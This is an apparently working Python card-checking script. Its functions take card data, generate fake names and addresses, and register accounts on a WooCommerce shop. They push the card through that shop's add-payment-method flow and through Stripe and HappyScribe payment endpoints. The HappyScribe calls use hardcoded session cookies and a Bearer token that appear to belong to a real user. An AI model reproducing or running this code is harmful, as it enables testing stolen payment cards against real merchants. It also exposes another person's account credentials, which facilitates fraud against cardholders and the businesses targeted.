...
def Tele(ccx):
	...
	def generate_full_name():
		first_names = [
		    "Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla",
		    "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada",
		    "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila",
		    "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim",
		    "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid",
		    "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi",
		    "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona",
		    "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam",
		    "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila",
		    "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
		    "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya",
		    "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha",
		    "Maher", "Heba", "Khaled", "Sally"
		]  # List of first names

		last_names = [
		    "Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith",
		    "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez",
		    "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen",
		    "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez",
		    "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres",
		    "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez",
		    "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell",
		    "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray",
		    "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson",
		    "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor",
		    "Turner", "Ward", "Watson", "Webb", "White", "Young"
		]  # List of last names
	...
	def generate_address():
		...
		streets = [
		    "Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St",
	...
	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"',
	...
	response = r.post('https://forfullflavor.com/my-account/',
	                  headers=headers,
	                  data=data)
	...
	response = r.get(
	    'https://forfullflavor.com/my-account/edit-address/billing/',
	    cookies=r.cookies,
	    headers=headers)

	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"',
	                    response.text).group(1)
	...
	response = r.get('https://forfullflavor.com/my-account/add-payment-method/',
	                 cookies=r.cookies,
	                 headers=headers)
	...
	response = r.post('https://forfullflavor.com/wp-admin/admin-ajax.php',
	                  cookies=r.cookies,
	                  headers=headers,
	                  data=data)
	...
	response = r.post('https://forfullflavor.com/my-account/add-payment-method/',
	                  cookies=r.cookies,
	                  headers=headers,
	                  data=data)
...
def stripe(ccx):
	...
	reso = requests.post('https://api.stripe.com/v1/payment_methods',
	                     headers=headers,
	                     data=data)

	cookies = {
	    'ahoy_visitor':
	    'aa9059eb-6025-4c9c-8c93-06b2e7f66bf1',
	    'ahoy_visit':
	    '80f8e7d9-33d9-4a44-a389-d3886d799439',
	    'cc_cookie':
	    ...
	    '_gcl_au':
	    '1.1.191496317.1716898280',
	    '_gid':
	    'GA1.2.1548126584.1716898280',
	    'remember_user_token':
	    'eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3hNVEk1TmpZME5WMHNJbVp4V2pSQkxYZExTQzF1ZUVWbWMwVkZSek16SWl3aU1UY3hOamc1T0RJNE9DNDFNemsyTnpZMElsMD0iLCJleHAiOiIyMDI0LTA2LTA0VDEyOjExOjI4LjUzOVoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--ff6189bcbd83ee1b8b9bdc57e2f2bab7bd7894e3',
	    'unsecure_is_signed_in':
	    '1',
	    '_cioid':
	    '11296645',
	    'intercom-device-id-frdatdus':
	    '65896fd8-9074-419f-82af-44775a9800f5',
	    '__stripe_mid':
	    'ae1e7330-bb67-4eb3-a23f-b13874ff22fea69fa5',
	    '__stripe_sid':
	    'e37d1483-f33b-4e9a-a2c9-a5611a239c53b05f6d',
	    '_gat_UA-97995424-1':
	    '1',
	    '_ga':
	    'GA1.1.1213546217.1716898279',
	    '_ga_4T8KCV9Y2D':
	    'GS1.1.1716911386.2.1.1716911702.60.0.0',
	    'intercom-session-frdatdus':
	    'WEFUY3IwWXgzU2g2RDg3T0plL0dwL2lUQW55TGlIeitYU0VSWW85dHRqMHl6aG5jZlNHQ3VlQ1hlL01xWm5lYS0tWmpqNDRtOS93RHFwN1pieUJmdnhWdz09--cf67edea8649a57c5be65bbe686daa16825a208d',
	    '_transcribe_session':
	    'GuXUkcJAbE1KxPl5eMKgotmHEhGgkSuczUsAONBjDAtmpodcvjwEVxhaC8tlEQk1ubDXBuAC9nFS5S3tihGZ1BKDQuRICcBbidB9cGQYegOpe6aRqzXjPKW3aUd%2FjvBJwkg5hjBKUMMARHtUhAVtMtsXtagcjdVOCFuvFCdu06RnYFBl%2FNI6ULW%2BxWE2sfsW%2F%2BEUj4wyfUMqjKSVr2xlQus1GnX7fGjveaJlHsPFJAWrnpxgzwy%2FM8Ys8j2wNgSvKAof9zsXN2HH3TK2S%2Fym808vOgJJGC3MdtIAp0kAc%2BA2sIAzvpVtnNrr0pZLCP85T1VZ5tPe387m%2FDC27xu1HvKZc2U%2F4YEMgy2N%2F7i9hGPm8d%2F%2BvqYGQ2QPMPZYvQ34snlJ8u%2FbZ%2FTJIQGhejj5W3p3Ow%3D%3D--fnFcV2OENluq4BD%2B--KIoAKM2gNf00FVX7WVRRMA%3D%3D',
	}
	...
	headers = {
	    ...
	    'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'authorization':
	    'Bearer OQRJtXO8dyPUQ3DMs8deCgtt',
	    'content-type':
	    'application/json',
	    ...
	    'referer':
	    'https://www.happyscribe.com/v2/10807386/checkout?new_subscription_interval=month&plan=pro_2023_05_01&step=billing_details',
	    'sec-ch-ua':
	    '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile':
	    '?1',
	...
	req = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment',
	                    cookies=cookies,
	                    headers=headers,
	                    json=json_data)
